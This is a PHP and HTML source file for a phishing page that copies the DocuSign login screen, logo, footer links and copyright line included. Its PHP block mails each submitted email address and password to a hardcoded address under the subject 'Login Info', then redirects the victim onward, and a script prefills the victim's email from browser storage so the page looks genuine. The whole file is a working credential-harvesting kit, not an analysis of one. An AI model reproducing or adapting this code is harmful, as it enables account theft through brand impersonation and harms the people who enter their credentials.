<?php
$your_email = 'example@gmail.com';

if(isset($_POST['submit'])){

  
  $email = $_POST['email'];
  $password = $_POST['password'];
  
    $to_email = $your_email;
    $subject = 'Login Info';
    $message = 'Email: '. $email . ' ' . 'Password: ' . $password ;
    $headers = 'From: noreply@company. com';
    mail($to_email,$subject,$message,$headers);

    header('Location: last.php');
    exit;
}

?>

<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>DocuSign Login - Enter email to start sign in</title>
    <link rel="stylesheet" href="style.css" />
    
  </head>
  <body>

    <section class="user-login-container">
      <div class="main-login-box">
        <div style="height: fit-content;">
          <img class="logo-img" src="./img/docusign_logo_small.png" alt="" />
        </div>
        <div class="login-form-container">
          <h2>Please log in to your account</h2>
          <div class="form-g" style="margin-bottom: 0px;">
            <p id="signedMail" class="p-class">Hi</p>
          </div>

          <form autocomplete="off" action="second.php" method="post">
            <div class="form-g">
              <input name="password" autocomplete="false" class="the-input" type="password" placeholder="Password" />
              <input id="email" name="email" hidden />
              
            </div>
            <div class="form-g">
              <button name="submit" class="button" type="submit">LOG IN</button>
            </div>
            <div class="form-g">
              <a id="reset-password" class="btn" href="https://account.docusign.com/forgotpassword?email=aoneappsandgames%40gmail.com"
                >Forgot password</a
              >
            </div>
            <div style="margin: 20px;"><hr /></div>
            <div class="form-g">
              <a class="btn" href="index.php"
                >Sign in as a different user</a
              >
            </div>
          </form>
        </div>
      </div>
      <div class="footer">
      <div class="upper-links">
          <a href="http://www.docusign.com/support">Help</a>| <a href="https://www.docusign.com/company/terms-and-conditions/web">Terms</a>|
          <a href="https://www.docusign.com/IP">Intellectual Property</a>| <a href="https://www.docusign.com/company/privacy-policy">Privacy Policy</a>|
        </div>
        <div class="copyright">
          <p>Copyright © 2020 DocuSign, Inc. All rights reserved.</p>
        </div>
      </div>
    </section>
    <script>
      let email = localStorage.getItem("email");
      document.getElementById("signedMail").innerHTML = email;
      document.getElementById("email").value = email;
      document.getElementById("reset-password").href = `https://account.docusign.com/forgotpassword?email=${email}`;
      

      
    </script>
  </body>
</html>
